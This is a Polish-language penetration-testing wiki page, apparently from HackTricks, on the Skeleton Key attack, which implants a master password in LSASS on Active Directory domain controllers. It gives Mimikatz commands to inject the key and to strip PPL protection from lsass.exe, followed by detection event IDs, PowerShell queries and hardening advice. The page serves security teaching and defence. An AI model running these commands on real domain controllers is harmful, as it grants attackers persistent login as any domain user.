# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack** to technika umożliwiająca atakującym **obejście uwierzytelniania Active Directory** poprzez **wstrzyknięcie hasła głównego** do procesu LSASS każdego kontrolera domeny. Po wstrzyknięciu hasło główne (domyślnie **`mimikatz`**) może służyć do uwierzytelniania jako **dowolny użytkownik domeny**, podczas gdy ich prawdziwe hasła nadal działają.<sup>[[1]](#references)[[2]](#references)</sup>

Najważniejsze informacje:

- Wymaga **Domain Admin/SYSTEM + SeDebugPrivilege** na każdym DC i musi zostać **zastosowane ponownie po każdym ponownym uruchomieniu**.<sup>[[2]](#references)</sup>
- Klasyczna implementacja Mimikatz modyfikuje ścieżki walidacji **NTLM** i **Kerberos RC4 (etype 0x17)**; uwierzytelnianie korzystające wyłącznie z AES **nie akceptuje tego hasła skeleton przez hook RC4**.<sup>[[2]](#references)</sup>
- Może powodować konflikty z zewnętrznymi pakietami uwierzytelniania LSA lub dodatkowymi dostawcami uwierzytelniania za pomocą kart inteligentnych / MFA.<sup>[[2]](#references)</sup>
- Moduł Mimikatz przyjmuje opcjonalny switch `/letaes`, aby uniknąć modyfikowania hooków Kerberos/AES w przypadku problemów ze zgodnością.<sup>[[3]](#references)</sup>

### Wykonanie

Klasyczny LSASS, niezabezpieczony przez PPL:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Jeśli **LSASS działa jako protected process light (PPL)**, dostęp debugowania z poziomu user-mode jest zablokowany. Opisana poniżej historyczna procedura Mimikatz ładuje sterownik jądra i usuwa ochronę przed patchowaniem LSASS. Credential Guard jest oddzielnym mechanizmem izolacji i nie należy używać tej nazwy jako synonimu PPL.<sup>[[3]](#references)[[4]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Po injection uwierzytelnij się za pomocą dowolnego konta domenowego, ale użyj hasła `mimikatz` (lub wartości ustawionej przez operatora). Pamiętaj, aby powtórzyć tę czynność na **wszystkich DC** w środowiskach z wieloma kontrolerami domeny.

## Mitigations

- **Monitorowanie logów**
- Systemowy **Event ID 7045** (instalacja usługi/sterownika) dla niepodpisanych sterowników, takich jak `mimidrv.sys`.
- **Sysmon**: Event ID 7 (ładowanie sterownika) dla `mimidrv.sys`; Event ID 10 dla podejrzanego dostępu do `lsass.exe` z procesów innych niż systemowe.
- Security **Event ID 4673/4611** dotyczące użycia wrażliwych uprawnień lub anomalii rejestracji pakietu uwierzytelniania LSA; skoreluj je z nieoczekiwanymi logowaniami 4624 z użyciem RC4 (etype 0x17) z DC.
- **Hardening LSASS**
- Pozostaw **RunAsPPL** i **Credential Guard** włączone, jeśli są obsługiwane. Zapewniają różne zabezpieczenia, a razem zwiększają koszt i ilość telemetrii związanej z próbami modyfikacji lub wydobycia sekretów LSASS.<sup>[[4]](#references)</sup>
- Wyłącz starszy **RC4**, jeśli to możliwe; bilety Kerberos ograniczone do AES uniemożliwiają użycie ścieżki hookowania RC4 wykorzystywanej przez skeleton key.<sup>[[2]](#references)</sup>
- Szybkie wyszukiwanie w PowerShell:
- Wykrywanie instalacji niepodpisanych sterowników kernelowych: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Wyszukiwanie sterownika Mimikatz: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Weryfikacja, czy PPL jest wymuszane po restarcie: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Dodatkowe wskazówki dotyczące hardeningu poświadczeń znajdziesz w sekcji [Ochrona poświadczeń systemu Windows](../stealing-credentials/credentials-protections.md).

## References

- [1] [Netwrix – Atak Skeleton Key w Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Moduł misc::skeleton Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
- [4] [Microsoft Learn — Konfigurowanie dodatkowej ochrony LSA](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
